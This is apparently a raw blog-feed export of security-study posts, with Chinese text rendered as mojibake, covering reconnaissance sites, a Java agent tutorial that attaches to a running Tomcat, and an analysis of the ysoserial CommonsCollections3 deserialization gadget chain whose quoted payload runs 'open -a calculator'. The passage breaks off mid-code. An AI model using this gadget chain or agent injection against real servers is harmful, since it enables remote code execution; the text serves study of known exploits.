        <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹ç›®å‰ç”¨åˆ°çš„æŸäº›å°å·¥å…·ï¼ˆä¸å…¨ï¼Œæ…¢æ…¢è¡¥ï¼Œä¸æ€¥ï¼‰</p><a id="more"></a><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="å­åŸŸåæ”¶é›†"><a href="#å­åŸŸåæ”¶é›†" class="headerlink" title="å­åŸŸåæ”¶é›†"></a>å­åŸŸåæ”¶é›†</h2><ul><li>  <a href="https://securitytrails.com/">https://securitytrails.com/</a></li></ul><h2 id="é’Ÿé¦—ä¹‹çœ¼"><a href="#é’Ÿé¦—ä¹‹çœ¼" class="headerlink" title="é’Ÿé¦—ä¹‹çœ¼"></a>é’Ÿé¦—ä¹‹çœ¼</h2><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><h2 id="censys"><a href="#censys" class="headerlink" title="censys"></a>censys</h2><p><a href="https://censys.io/">https://censys.io/</a></p><h2 id="ipå†å²è§£æ"><a href="#ipå†å²è§£æ" class="headerlink" title="ipå†å²è§£æ"></a>ipå†å²è§£æ</h2><ul><li>  ipæŸ¥è¯¢ï¼š<a href="https://ipchaxun.com/">https://ipchaxun.com/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-agent å…¥é—¨</title>
      <link href="/java-agent.html"/>
      <url>/java-agent.html</url>
      
        <content type="html"><![CDATA[<p><code>java-agent</code>åŸºç¡€å­¦ä¹ </p><a id="more"></a><h1 id="Java-agent"><a href="#Java-agent" class="headerlink" title="Java-agent"></a>Java-agent</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p>ä»‹ç»å•¥çš„ä¹‹åå†è¡¥å§ï¼ˆ</p><p>å…ˆæŠŠä»£ç è´´ä¸Šå»ï¼Œå…å¾—å¿˜äº†</p><p>ä½¿ç”¨æ–¹æ³•æœ‰ä¸¤ç§ï¼š</p><p>ç”±<code>MANIFEST&gt;MF</code>å†³å®šï¼ˆæ³¨ï¼š<code>:</code>ä¹‹åä¸€å®šè¦æœ‰ä¸€ä¸ªç©ºæ ¼ï¼‰</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Manifest-Version</span>: <span class="string">1.0</span></span><br><span class="line"><span class="meta">Can-Redefine-Classes</span>: <span class="string">true</span></span><br><span class="line"><span class="meta">Can-Retransform-Classes</span>: <span class="string">true</span></span><br><span class="line"><span class="meta">Agent-Class</span>: <span class="string">agent.TestAgent2</span></span><br><span class="line"><span class="meta">Pre-Class</span>: <span class="string">agent.TestAgent1</span></span><br></pre></td></tr></table></figure><p>åˆ†åˆ«å¯¹åº”ä¸‹åˆ—ä¸¤ç§æƒ…å†µï¼š</p><ul><li><p>JVMå¯åŠ¨å‰é™æ€Instrument</p><ul><li><p><code>premain</code>æ–¹æ³•</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TestAgent1.java</span></span><br><span class="line"><span class="keyword">package</span> agent;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        System.out.println(&quot;premain test&quot;);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;agent args: &quot;</span> + agentArgs);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//        System.out.println(agentArgs);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain load class: &quot;</span> + className);</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>JVMå¯åŠ¨ååŠ¨æ€Instrument</p><ul><li><p><code>agentmain</code>æ–¹æ³•</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TestAgent2.java</span></span><br><span class="line"><span class="keyword">package</span> agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestAgent2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">&quot;/tmp/tomcat/a&quot;</span>), <span class="keyword">false</span>);</span><br><span class="line">        fileOutputStream.write(<span class="string">&quot;start\n&quot;</span>.getBytes());</span><br><span class="line">        Class&lt;?&gt;[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;?&gt; aClass : classes) &#123;</span><br><span class="line">            Boolean isMod = inst.isModifiableClass(aClass);</span><br><span class="line">            String mod;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">if</span> (isMod) &#123;</span><br><span class="line">                mod = <span class="string">&quot;True&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mod = <span class="string">&quot;false&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String classname = <span class="string">&quot;class &quot;</span> + i + <span class="string">&quot; name: &quot;</span> + aClass.getName() + <span class="string">&quot;\t\t&quot;</span> + mod + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            fileOutputStream.write(classname.getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        fileOutputStream.write(<span class="string">&quot;ends\n&quot;</span>.getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="JVMå¯åŠ¨å‰é™æ€Instrument"><a href="#JVMå¯åŠ¨å‰é™æ€Instrument" class="headerlink" title="JVMå¯åŠ¨å‰é™æ€Instrument"></a>JVMå¯åŠ¨å‰é™æ€Instrument</h3><p>åœ¨JVMå¯åŠ¨å‰ä½¿ç”¨<code>java-agent</code>éœ€è¦ä½¿ç”¨<code>-javaagent:jar_path.jar</code></p><p>å‚æ•°æŒ‡å®š<code>jar_path.jar</code>æ¥æŒ‡å®š</p><p>å…·ä½“çš„è¯­æ³•åœ¨ä¹‹ååˆ—å‡º</p><h3 id="JVMå¯åŠ¨ååŠ¨æ€Instrument"><a href="#JVMå¯åŠ¨ååŠ¨æ€Instrument" class="headerlink" title="JVMå¯åŠ¨ååŠ¨æ€Instrument"></a>JVMå¯åŠ¨ååŠ¨æ€Instrument</h3><p>éœ€è¦å¾—åˆ°è¢«æ’å…¥è¿›ç¨‹çš„<code>pid</code>ï¼Œç”¨<code>jps -m</code>å¯ä»¥çœ‹åˆ°</p><p>éœ€è¦æ–°å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œæ’å…¥ç›¸åº”çš„jaråŒ…</p><p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AgentInitializationException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AgentLoadException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AttachNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException </span>&#123;</span><br><span class="line">        VirtualMachine vm = VirtualMachine.attach(<span class="string">&quot;pid&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String path = your_jar_path;</span><br><span class="line">            vm.loadAgent(path);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AgentLoadException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AgentInitializationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯åŠ¨<code>tomcat</code>ï¼Œå†™ä¸€ä¸ªç®€å•çš„é¡µé¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/login&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;&lt;h1&gt;hello&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¼å‡ºçš„ç»“æœ</p><p>ç”±äºå¤ªé•¿äº†ï¼Œåªå–ä¸€å°éƒ¨åˆ†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">start</span><br><span class="line">class 1 name: jdk.internal.reflect.GeneratedConstructorAccessor8True</span><br><span class="line">class 2 name: jdk.internal.reflect.GeneratedMethodAccessor22True</span><br><span class="line">class 3 name: jdk.internal.reflect.GeneratedMethodAccessor21True</span><br><span class="line">class 4 name: jdk.internal.reflect.GeneratedMethodAccessor20True</span><br><span class="line">class 5 name: jdk.internal.reflect.GeneratedMethodAccessor19True</span><br><span class="line">class 6 name: jdk.internal.reflect.GeneratedMethodAccessor18True</span><br><span class="line">class 7name: LoginServletTrue</span><br><span class="line">class 8 name: jdk.internal.reflect.GeneratedSerializationConstructorAccessor18True</span><br><span class="line">class 9 name: java.lang.invoke.LambdaForm$MH&#x2F;0x0000000800c8ac40false</span><br><span class="line">class 10 name: java.lang.invoke.LambdaForm$MH&#x2F;0x0000000800c8a840false</span><br><span class="line">class 11 name: java.lang.invoke.LambdaForm$MH&#x2F;0x0000000800c8a440false</span><br></pre></td></tr></table></figure><h2 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
          <category> java-agent </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
            <tag> java-agent </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonCollections3 åˆ†æ</title>
      <link href="/CommonCollections3.html"/>
      <url>/CommonCollections3.html</url>
      
        <content type="html"><![CDATA[<p>å¯¹<code>ysoserial</code>å·¥å…·ä¸­<code>CommonCollections3</code>åˆ©ç”¨é“¾åˆ†æï¼Œè·Ÿè¸ªè°ƒè¯•ã€‚</p><a id="more"></a><h1 id="CommonCollections3"><a href="#CommonCollections3" class="headerlink" title="CommonCollections3"></a>CommonCollections3</h1><h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Variation on CommonsCollections1 that uses InstantiateTransformer instead of</span></span><br><span class="line"><span class="comment"> * InvokerTransformer.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>ç›¸æ¯”<code>CommonCollection1</code>æ¥è¯´ï¼Œç”¨<code>InstantiateTransformer</code>ä»£æ›¿äº†<code>InvokerTransformer</code></p><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Object templatesImpl = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line"><span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line"><span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; Templates.class &#125;,</span><br><span class="line"><span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String command[] = &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;;</span><br><span class="line">    PayloadRunner.run(CommonsCollections3.class, command);</span><br><span class="line"><span class="comment">//PayloadRunner.run(CommonsCollections3.class, args);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åˆ†æ-amp-è°ƒè¯•"><a href="#åˆ†æ-amp-è°ƒè¯•" class="headerlink" title="åˆ†æ&amp;è°ƒè¯•"></a>åˆ†æ&amp;è°ƒè¯•</h2><p>å‰é¢çš„è¿‡ç¨‹å’Œ<code>CommomCollections1</code>ä¸€æ ·ï¼Œé€šè¿‡<code>AnnotationInvocationHandler</code>çš„<code>readObject</code>æ–¹æ³•è°ƒç”¨<code>LazyMap.get()</code>æ–¹æ³•</p><p>åœ¨<code>LazyMap.get()</code>æ–¹æ³•ä¸­ï¼Œæ‰ç”¨äº†<code>factory.transform</code>æ–¹æ³•ï¼Œä»è€Œè§¦å‘<code>ChainedTransformer</code></p><p>ä¹‹åå°±äº§ç”Ÿäº†äº›è®¸çš„ä¸åŒ</p><p>åœ¨<code>ChainedTransformer</code>ä¸­çš„å¯¹è±¡ä¸å†æ˜¯é‚£ä¸€ä¸²<code>invokerTransformer</code>ï¼Œè€Œæ˜¯ä¸€ä¸ª<code>InstantiateTransformer</code></p><h4 id="InstantiateTransformer-java"><a href="#InstantiateTransformer-java" class="headerlink" title="InstantiateTransformer.java"></a>InstantiateTransformer.java</h4><p>è¿˜æ˜¯åªéœ€è¦çœ‹<code>transform</code>æ–¹æ³•å°±è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Transforms the input Class object to a result by instantiation.</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                + (input == <span class="keyword">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor con = ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯´çš„ç®€å•ç‚¹å°±æ˜¯æ ¹æ®<code>Object input</code>çš„å…·æœ‰<code>iParamTypes</code>çš„æ„é€ å™¨ï¼Œä»¥<code>iArgs</code>ä½œä¸ºå‚æ•°ï¼Œæ„é€ ä¸€ä¸ªå¯¹è±¡</p><p>åœ¨è¿™æ¡é“¾ä¸­ï¼Œæ„é€ çš„å¯¹è±¡æ˜¯<code>TrAXFilter</code>ï¼Œå‚æ•°ç±»å‹æ˜¯<code>Templates</code>ï¼Œå®ä½“å‚æ•°æ˜¯ç”±<code>Gadgets.createTemplatesImpl(command)</code>äº§ç”Ÿçš„å’Œ<code>CommonCollections2</code>ä¸€æ ·çš„ä¸€ä¸ªåˆ©ç”¨é“¾</p><p>åªè¦èƒ½å¤Ÿè§¦å‘<code>TemplatesImpl.newInstance</code>å°±å¯ä»¥è§¦å‘<code>Runtime.getRuntime.exec(command)</code></p><h3 id="TrAXFilter-java"><a href="#TrAXFilter-java" class="headerlink" title="TrAXFilter.java"></a>TrAXFilter.java</h3><p>ç»§æ‰¿è‡ª<code>XMLFilterImpl</code>ï¼Œå®ç°çš„æ˜¯ä¸€ä¸ª<code>XMLè¿‡æ»¤å™¨</code></p><p>çœ‹ä¸€ä¸‹å¸¦<code>Template</code>å‚æ•°çš„æ„é€ å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">        TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äº”è¡Œè°ƒç”¨äº†<code>templates.newTransformer()</code></p><h3 id="TemplatesImpl-java"><a href="#TemplatesImpl-java" class="headerlink" title="TemplatesImpl.java"></a>TemplatesImpl.java</h3><h4 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer"></a>newTransformer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Implements JAXP&#x27;s Templates.newTransformer()</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">                                      _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> 